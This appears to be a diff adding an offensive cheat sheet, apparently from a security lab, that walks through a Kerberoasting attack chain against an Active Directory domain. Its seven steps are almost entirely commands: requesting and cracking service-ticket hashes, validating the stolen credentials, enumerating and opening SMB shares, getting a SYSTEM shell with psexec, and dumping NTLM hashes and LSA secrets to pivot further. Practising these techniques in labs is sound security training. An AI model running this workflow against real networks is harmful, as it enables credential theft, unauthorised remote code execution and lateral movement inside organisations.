@@ -1,0 +1,50 @@
+########################################
+# Kerberoasting – Full Attack Workflow #
+########################################
+
+-----------------------------------------
+1. Enumerate SPNs & Dump Hash
+-----------------------------------------
+impacket-GetUserSPNs securelab.local/USERNAME:PASSWORD -dc-ip <DC_IP> -request
+# Extract TGS hash of Kerberoastable service account
+# Save the hash to spn.txt
+
+-----------------------------------------
+2. Crack the TGS Hash (Hashcat)
+-----------------------------------------
+hashcat -m 13100 spn.txt /usr/share/wordlists/rockyou.txt --force
+# After cracking note the password for post-exploitation
+
+-----------------------------------------
+3. Validate Credentials & Check Access
+-----------------------------------------
+crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD>
+# Confirms cracked credentials are valid and authentication works
+
+-----------------------------------------
+4. Enumerate SMB Shares for Lateral Movement Opportunity
+-----------------------------------------
+crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> --shares
+# Lists accessible shares for lateral movement
+
+-----------------------------------------
+5. Access Shares via SMB
+-----------------------------------------
+
+# List all shares using domain\username%password format
+smbclient -L //<TARGET_IP> -U "<DOMAIN>/<USERNAME>%<PASSWORD>"
+
+# Access a specific share and directly list its content
+smbclient //<TARGET_IP>/<SHARE_NAME> -U "<DOMAIN>/<USERNAME>%<PASSWORD>" -c 'ls'
+
+-----------------------------------------
+6. Remote Code Execution / Shell Access
+-----------------------------------------
+impacket-psexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
+# Provides SYSTEM-level shell on target (if privileges allow)
+
+-----------------------------------------
+7. Dump Secrets from Compromised Host
+-----------------------------------------
+impacket-secretsdump <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
+# Dumps NTLM hashes, LSA secrets & cached credentials to pivot further
